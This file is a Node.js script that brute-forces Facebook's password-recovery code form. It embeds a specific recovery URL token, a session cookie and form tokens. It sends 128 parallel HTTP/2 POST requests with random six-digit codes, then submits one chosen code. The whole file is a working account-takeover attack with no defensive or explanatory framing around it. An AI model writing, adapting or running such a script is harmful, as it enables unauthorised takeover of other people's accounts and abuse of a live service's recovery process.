'use strict';

const log = console.log.bind(console);
const Http2Client = require('./http2-client');
const helpers = require('./helpers');
const child_process = require('node:child_process');
const fs = require('node:fs');

const { rand } = helpers;

const httpClient = new Http2Client(false);

const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';

(async () => {
  const url = 'https://www.facebook.com/recover/code/?cuid=AYg_cW3yZHSOcFTqkoBbPBws-qKC4dNk4jS9PGwVWxM7fyX0DGYV-fOpwNg9GQYyD3hfttbudcvOpEbqt-Cq30liV37yoCATZHm0Srw9N2W0SifcLJk5ZeaXyXuxokKfmLwM8W5QniBE34dZdLEiIMkwtAwrMmz2tNaPd3GlTGpFAhxNTZ6Js-bkmBmIKUe5g66778cr7hiDNNMmQnATRU4tBDduBOh6l6cAMqgeCCJb35sY8HhFawj4hf5VpW0agcB1oxVGAOq9Sc2ghstKl7gZ0qlI_M9UwnnQeTCrnM6khQ';
  const headers = {
    'Cookie': 'datr=F_YuaFQVmcfePVvsUJJtDvkK',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': USER_AGENT,
    'Sec-Fetch-Site': 'same-origin'
  };
  // const codes = require('./codes');

  // child_process.exec('siren warn');

  const p = [];
  for (let i = 0, code; 128 > i; ++i) {
    code = rand(111111, 999999);
    p.push(new Promise(r => httpClient.post(url, headers, 'lsd=AVrCihG3UJY&n='+code).then(res => (log(res.statusCode), r()))));
  }

  Promise.all(p).then(() => {
    httpClient.post(url, headers, 'lsd=AVpc27UC8Ng&n=896475').then(res => log(res.statusCode));
  });
})();